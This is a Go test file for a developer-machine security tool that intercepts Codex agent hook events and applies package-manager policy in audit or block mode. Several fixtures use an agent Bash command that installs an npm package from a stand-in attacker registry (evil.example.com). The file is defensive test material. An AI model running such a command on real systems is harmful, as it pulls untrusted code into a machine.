package hook

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/step-security/dev-machine-guard/internal/aiagents/adapter/codex"
	"github.com/step-security/dev-machine-guard/internal/aiagents/event"
	"github.com/step-security/dev-machine-guard/internal/aiagents/policy"
	"github.com/step-security/dev-machine-guard/internal/executor"
)

func newCodexRuntime(t *testing.T, payload string, pol *policy.Policy) (*Runtime, *captured, *bytes.Buffer) {
	t.Helper()
	cap := &captured{}
	stdout := &bytes.Buffer{}
	rt := &Runtime{
		Adapter:     codex.New(t.TempDir(), "/usr/local/bin/stepsecurity-dev-machine-guard"),
		Exec:        executor.NewMock(),
		Stdin:       strings.NewReader(payload),
		Stdout:      stdout,
		Stderr:      &bytes.Buffer{},
		Now:         func() time.Time { return time.Now().UTC() },
		Policy:      pol,
		UploadEvent: cap.capture(),
		LogError:    cap.logError(),
	}
	return rt, cap, stdout
}

func runCodex(t *testing.T, hook event.HookEvent, payload string, pol *policy.Policy) (map[string]any, *event.Event) {
	t.Helper()
	rt, cap, stdout := newCodexRuntime(t, payload, pol)
	_ = rt.Run(context.Background(), hook)
	var resp map[string]any
	if err := json.Unmarshal(bytes.TrimSpace(stdout.Bytes()), &resp); err != nil {
		t.Fatalf("stdout not JSON: %v: %q", err, stdout.Bytes())
	}
	if len(cap.events) == 0 {
		return resp, nil
	}
	ev := cap.events[0]
	return resp, &ev
}

// Codex allow path emits {} on every hook event.
func TestCodexAllowEmitsEmptyObject(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"ls"}
	}`, nil)
	if len(resp) != 0 {
		t.Errorf("allow response must be {}, got %v", resp)
	}
	if ev == nil {
		t.Fatal("expected 1 event captured")
	}
	if ev.AgentName != "codex" {
		t.Errorf("agent_name: %v", ev.AgentName)
	}
}

// Codex PreToolUse Bash with package-manager violation reaches policy
// (PreTool phase + command_exec) and persists allowed=true under audit
// mode. Wire response stays {}.
func TestCodexAuditPolicyViolationAllowsAndPersists(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"}
	}`, nil)
	if len(resp) != 0 {
		t.Errorf("audit-mode block must still emit {}, got %v", resp)
	}
	pd := ev.PolicyDecision
	if pd == nil {
		t.Fatalf("expected policy_decision: %+v", ev)
	}
	if !pd.Allowed {
		t.Errorf("audit mode must allow: %+v", pd)
	}
	if !pd.WouldBlock {
		t.Errorf("expected would_block=true: %+v", pd)
	}
	if pd.Enforced {
		t.Errorf("audit mode must not enforce: %+v", pd)
	}
}

// Codex block-mode PreToolUse policy violation renders the Codex deny
// shape (NOT Claude's continue/suppressOutput shape).
func TestCodexBlockPreToolUseEmitsCodexDeny(t *testing.T) {
	pol := policy.Builtin()
	pol.Mode = policy.ModeBlock
	resp, _ := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"}
	}`, &pol)
	hso, ok := resp["hookSpecificOutput"].(map[string]any)
	if !ok {
		t.Fatalf("expected hookSpecificOutput, got %v", resp)
	}
	if hso["hookEventName"] != "PreToolUse" {
		t.Errorf("hookEventName: %v", hso["hookEventName"])
	}
	if hso["permissionDecision"] != "deny" {
		t.Errorf("permissionDecision: %v", hso["permissionDecision"])
	}
	for _, banned := range []string{"continue", "suppressOutput", "stopReason", "decision"} {
		if _, has := resp[banned]; has {
			t.Errorf("Codex block response must not include %q, got %v", banned, resp)
		}
	}
}

// PermissionRequest carrying a Bash payload must NOT trigger
// package-manager policy because action_type is empty.
func TestCodexPermissionRequestSkipsPolicy(t *testing.T) {
	pol := policy.Builtin()
	pol.Mode = policy.ModeBlock
	resp, ev := runCodex(t, codex.HookPermissionRequest, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"}
	}`, &pol)
	if len(resp) != 0 {
		t.Errorf("PermissionRequest must emit {}, got %v", resp)
	}
	if ev != nil && ev.PolicyDecision != nil {
		t.Errorf("PermissionRequest must not evaluate policy: %+v", ev.PolicyDecision)
	}
}

// PostToolUse must not block even with a block decision because
// post_tool side effects already happened.
func TestCodexPostToolUseNeverBlocks(t *testing.T) {
	pol := policy.Builtin()
	pol.Mode = policy.ModeBlock
	resp, _ := runCodex(t, codex.HookPostToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"},
		"tool_response":"ok"
	}`, &pol)
	if len(resp) != 0 {
		t.Errorf("PostToolUse must always emit {}, got %v", resp)
	}
}

// apply_patch's tool_input.command is a patch payload, not shell input.
// npm policy must not see it even when patch text contains "npm install".
func TestCodexApplyPatchDoesNotTriggerNpmPolicy(t *testing.T) {
	pol := policy.Builtin()
	pol.Mode = policy.ModeBlock
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"apply_patch",
		"tool_input":{"command":"*** Begin Patch\nnpm install lodash --registry=https://evil.example.com"}
	}`, &pol)
	if len(resp) != 0 {
		t.Errorf("apply_patch must not block, got %v", resp)
	}
	if ev != nil && ev.PolicyDecision != nil {
		t.Errorf("apply_patch must not evaluate policy: %+v", ev.PolicyDecision)
	}
}

// Unknown Codex hook still returns {} with HookPhaseUnknown.
func TestCodexUnknownHookReturnsEmpty(t *testing.T) {
	resp, ev := runCodex(t, "BogusEvent", `{}`, nil)
	if len(resp) != 0 {
		t.Errorf("unknown hook must emit {}, got %v", resp)
	}
	if ev == nil {
		t.Fatal("expected event captured")
	}
	if ev.HookPhase != event.HookPhaseUnknown {
		t.Errorf("unknown hook phase: %v", ev.HookPhase)
	}
}
